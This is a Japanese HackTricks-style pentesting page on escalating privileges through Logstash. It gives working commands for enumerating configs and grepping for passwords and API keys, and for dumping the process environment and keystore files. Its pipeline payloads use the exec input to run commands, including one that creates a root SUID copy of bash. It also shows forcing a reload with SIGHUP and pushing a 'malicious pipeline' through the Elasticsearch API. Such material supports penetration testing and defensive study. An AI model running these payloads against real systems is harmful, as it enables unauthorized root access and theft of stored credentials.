# Logstash 権限昇格

{{#include ../../banners/hacktricks-training.md}}

## Logstash

Logstash は、**pipelines** と呼ばれるシステムを通じて、**ログの収集、変換、配信** に使用されます。これらの pipelines は、**input**、**filter**、**output** の各ステージで構成されます。<sup>[[4]](#references)</sup> Logstash が侵害されたマシン上で動作している場合、興味深い側面が生じます。

### Pipeline Configuration

Debian および RPM パッケージのインストールでは、pipelines は **/etc/logstash/pipelines.yml** で設定されます。このファイルには pipeline 設定の場所が記載されています。それ以外のディストリビューションでは、`pipelines.yml` は Logstash の `path.settings` ディレクトリに配置されます。<sup>[[5]](#references)[[6]](#references)</sup>
```yaml
# Define your pipelines here. Multiple pipelines can be defined.
# For details on multiple pipelines, refer to the documentation:
# https://www.elastic.co/guide/en/logstash/current/multiple-pipelines.html

- pipeline.id: main
path.config: "/etc/logstash/conf.d/*.conf"
- pipeline.id: example
path.config: "/usr/share/logstash/pipeline/1*.conf"
pipeline.workers: 6
```
このファイルから、pipeline configurations を含む **.conf** files の場所が分かります。**Elasticsearch output** を使用している場合は、`user`/`password`、`cloud_auth`、または `api_key` の設定を確認してください。アカウントの実効 privileges は Elasticsearch に依存します。`path.config` の glob は、その pipeline に対して一致するすべての file を読み込みます。<sup>[[6]](#references)[[7]](#references)[[11]](#references)</sup>

Logstash が `pipelines.yml` の代わりに `-f <directory>` で起動されている場合、`-f` が優先され、**その directory 内のすべての file が辞書順に連結され、単一の config として parse されます**。<sup>[[6]](#references)[[7]](#references)</sup> これにより、攻撃上、次の 2 つの implications が生じます。

- `000-input.conf` や `zzz-output.conf` のように配置した file によって、最終的な pipeline の組み立て方を変更できる
- malformed file によって連結された config の validation が失敗する可能性がある。reload 中、Logstash は以前の pipeline を保持するため、auto-reload に依存する前に payloads を validate すること。<sup>[[1]](#references)</sup>

### 侵害済みホストでの高速な Enumeration

Logstash が install されている host では、次をすばやく確認します:
```bash
ps aux | grep -i logstash
systemctl cat logstash 2>/dev/null
cat /etc/logstash/pipelines.yml 2>/dev/null
cat /etc/logstash/logstash.yml 2>/dev/null
find /etc/logstash /usr/share/logstash -maxdepth 3 -type f \( -name '*.conf' -o -name 'logstash.yml' -o -name 'pipelines.yml' \) -ls
rg -n --hidden -S 'password|passwd|api[_-]?key|cloud_auth|ssl_keystore_password|truststore_password|user\s*=>|hosts\s*=>' /etc/logstash /usr/share/logstash 2>/dev/null
```
また、ローカル monitoring API にアクセスできるかどうかも確認します。デフォルトでは **127.0.0.1:9600** に bind されます。これは通常、ホストに landing した後で十分です。<sup>[[8]](#references)</sup>
```bash
curl -s http://127.0.0.1:9600/?pretty
curl -s http://127.0.0.1:9600/_node/pipelines?pretty
curl -s http://127.0.0.1:9600/_node/stats/pipelines?pretty
```
これらの endpoint は pipeline ID と設定、runtime metrics、config reload の成功／失敗カウンターを公開するため、変更が受け入れられたかどうかの確認に役立ちます。<sup>[[8]](#references)[[17]](#references)[[18]](#references)</sup>

回収した credential が **Elasticsearch** を対象としている場合は、[Elasticsearch に関するこちらの別ページ](../../network-services-pentesting/9200-pentesting-elasticsearch.md)を確認してください。

### Writable Pipelines を介した Privilege Escalation

Privilege Escalation を試みるには、まず Logstash service が実際にどの user で実行されているかを特定してください。root または **logstash** user だと決めつけてはいけません。以下の**いずれか 1 つ**を満たしていることを確認します。

- pipeline **.conf** file への**書き込みアクセス**を持っている **または**
- **/etc/logstash/pipelines.yml** file が wildcard を使用しており、対象 folder に書き込める。<sup>[[6]](#references)[[7]](#references)</sup>

さらに、以下の**いずれか 1 つ**の条件を満たす必要があります。

- Logstash service を restart できる **または**
- **/etc/logstash/logstash.yml** file に **config.reload.automatic: true** が設定されている。<sup>[[1]](#references)[[15]](#references)</sup>

設定に wildcard がある場合、その wildcard に一致する file を作成することで command execution が可能になります。<sup>[[7]](#references)[[9]](#references)</sup> 例えば：
```bash
input {
exec {
command => "whoami"
interval => 120
}
}

output {
file {
path => "/tmp/output.log"
codec => rubydebug
}
}
```
ここで、**interval** は実行頻度を秒単位で指定します。示した例では、**whoami** コマンドが120秒ごとに実行され、その出力が **/tmp/output.log** にリダイレクトされます。<sup>[[9]](#references)</sup>

**/etc/logstash/logstash.yml** で **config.reload.automatic: true** を設定すると、Logstash は再起動なしで、新規または変更された pipeline 設定を自動的に検出して適用します。<sup>[[1]](#references)[[15]](#references)</sup> ワイルドカードがない場合でも既存の設定を変更できますが、動作を中断させないよう注意が必要です。

### より信頼性の高い Pipeline Payload

`exec` input plugin は現在のリリースでも動作し、`interval` または `schedule` のいずれかが必要です。Logstash JVM を **fork** して実行するため、メモリに余裕がない場合、payload は何も起こらずに実行されるのではなく、`ENOMEM` で失敗する可能性があります。<sup>[[9]](#references)</sup>

サービスに root 所有の SUID ファイルを作成する十分な権限がある場合、実用的な privilege-escalation payload は、永続的な artifact を残すものです:
```bash
input {
exec {
command => "cp /bin/bash /tmp/logroot && chown root:root /tmp/logroot && chmod 4755 /tmp/logroot"
interval => 300
}
}
output {
null {}
}
```
再起動権限がなくてもプロセスに signal を送信できる場合、Logstash は Unix-like systems 上で **SIGHUP** による reload もサポートしています:<sup>[[1]](#references)</sup>
```bash
kill -SIGHUP $(pgrep -f logstash)
```
すべての plugin が reload-friendly とは限らない点に注意してください。たとえば、**stdin** input は自動 reload を妨げるため、`config.reload.automatic` が常に変更を反映すると考えないでください。<sup>[[1]](#references)</sup>

### Logstash から Secrets を窃取する

code execution だけに注目する前に、Logstash がすでにアクセスできるデータを収集します。

- Credentials は `elasticsearch {}` outputs、`http_poller` の URLs/settings、JDBC inputs、または cloud 関連の settings に現れる可能性があります。これらの plugins には、検索する価値のある credential fields があります。<sup>[[11]](#references)[[12]](#references)[[13]](#references)</sup>
- Secure settings は **`/etc/logstash/logstash.keystore`** または別の `path.settings` directory に存在する場合があります。<sup>[[5]](#references)[[10]](#references)</sup>
- Keystore password は **`LOGSTASH_KEYSTORE_PASS`** を通じて指定される場合があり、RPM/DEB installs は **`/etc/sysconfig/logstash`** から service environment variables を読み込みます。<sup>[[10]](#references)</sup>
- `${VAR}` による Environment-variable expansion は Logstash startup 時に解決されるため、service environment を調査する価値があります。<sup>[[14]](#references)</sup>

Useful checks:
```bash
ls -l /etc/logstash /etc/logstash/logstash.keystore 2>/dev/null
strings /etc/logstash/conf.d/*.conf 2>/dev/null | head
tr '\0' '\n' < /proc/$(pgrep -o -f logstash)/environ 2>/dev/null | sort
cat /etc/sysconfig/logstash 2>/dev/null
journalctl -u logstash --no-pager 2>/dev/null | tail -n 200
ls -lah /var/log/logstash 2>/dev/null
```
これは確認する価値もあります。**CVE-2023-46672** により、特定の状況下では、Logstash が keystore に保存され、configuration から参照される secrets などの機密情報を logs に記録していたことが明らかになりました。そのような状況が該当する可能性がある場合は、古い Logstash logs と `journald` entries を確認してください。<sup>[[3]](#references)</sup>

### Centralized Pipeline Management の悪用

環境によっては、host がローカルの `.conf` files にまったく依存していない場合があります。**`xpack.management.enabled: true`** が設定されている場合、Logstash は Elasticsearch/Kibana から centrally managed pipelines を取得できます。この mode を有効にすると、ローカルの pipeline configs はもはや source of truth ではありません。<sup>[[2]](#references)</sup>

つまり、別の attack path が存在します。

1. ローカルの Logstash settings、keystore、または logs から Elastic credentials を取得します。<sup>[[3]](#references)[[10]](#references)</sup>
2. アカウントが **`manage_logstash_pipelines`** cluster privilege を持っているか確認します。<sup>[[16]](#references)</sup>
3. centrally managed pipeline を作成または置き換え、次の poll interval で Logstash host に payload を実行させます。<sup>[[2]](#references)[[16]](#references)</sup>

この feature で使用される Elasticsearch API は次のとおりです。<sup>[[16]](#references)</sup>
```bash
curl -X PUT http://ELASTIC:9200/_logstash/pipeline/pwned \
-H 'Content-Type: application/json' \
-u user:password \
-d '{
"description": "malicious pipeline",
"last_modified": "2026-01-02T02:50:51.250Z",
"username": "user",
"pipeline": "input { exec { command => \"id > /tmp/.ls-rce\" interval => 120 } } output { null {} }",
"pipeline_metadata": {"type": "logstash_pipeline", "version": "1"},
"pipeline_settings": {
"pipeline.workers": 1,
"pipeline.batch.size": 1,
"pipeline.batch.delay": 50,
"queue.type": "memory",
"queue.max_bytes": "1gb",
"queue.checkpoint.writes": 1024
}
}'
```
これは、ローカルファイルが読み取り専用である一方、Logstash がすでにリモートから pipeline を取得するよう登録されている場合に特に有用です。<sup>[[2]](#references)[[16]](#references)</sup>

## References

- [1] [Elastic Docs: 設定ファイルの再読み込み](https://www.elastic.co/guide/en/logstash/8.19/reloading-config.html)
- [2] [Elastic Docs: Centralized Pipeline Management の設定](https://www.elastic.co/guide/en/logstash/8.19/configuring-centralized-pipelines.html)
- [3] [Logstash 8.11.1 Security Update (ESA-2023-26) - CVE-2023-46672](https://discuss.elastic.co/t/logstash-8-11-1-security-update-esa-2023-26/347191)
- [4] [Elastic Docs: Logstash pipeline の作成](https://www.elastic.co/docs/reference/logstash/creating-logstash-pipeline)
- [5] [Elastic Docs: Logstash のディレクトリレイアウト](https://www.elastic.co/docs/reference/logstash/dir-layout)
- [6] [Elastic Docs: 複数の pipeline](https://www.elastic.co/docs/reference/logstash/multiple-pipelines)
- [7] [Elastic Docs: コマンドラインからの Logstash の実行](https://www.elastic.co/docs/reference/logstash/running-logstash-command-line)
- [8] [Elastic Docs: API による Logstash の監視](https://www.elastic.co/docs/reference/logstash/monitoring-logstash)
- [9] [Elastic Docs: Exec input plugin](https://www.elastic.co/docs/reference/logstash/plugins/plugins-inputs-exec)
- [10] [Elastic Docs: secure settings 用の Secrets keystore](https://www.elastic.co/docs/reference/logstash/keystore)
- [11] [Elastic Docs: Elasticsearch output plugin](https://www.elastic.co/docs/reference/logstash/plugins/plugins-outputs-elasticsearch)
- [12] [Elastic Docs: Http_poller input plugin](https://www.elastic.co/docs/reference/logstash/plugins/plugins-inputs-http_poller)
- [13] [Elastic Docs: Jdbc input plugin](https://www.elastic.co/docs/reference/logstash/plugins/plugins-inputs-jdbc)
- [14] [Elastic Docs: 環境変数の使用](https://www.elastic.co/docs/reference/logstash/environment-variables)
- [15] [Elastic Docs: logstash.yml](https://www.elastic.co/docs/reference/logstash/logstash-settings-file)
- [16] [Elasticsearch API: Logstash pipeline の作成または更新](https://www.elastic.co/docs/api/doc/elasticsearch/operation/operation-logstash-put-pipeline)
- [17] [Logstash API: pipeline の設定の取得](https://www.elastic.co/docs/api/doc/logstash/operation/operation-nodeinfopipelines)
- [18] [Logstash API: pipeline の統計情報の取得](https://www.elastic.co/docs/api/doc/logstash/operation/operation-nodestatspipelines)
{{#include ../../banners/hacktricks-training.md}}
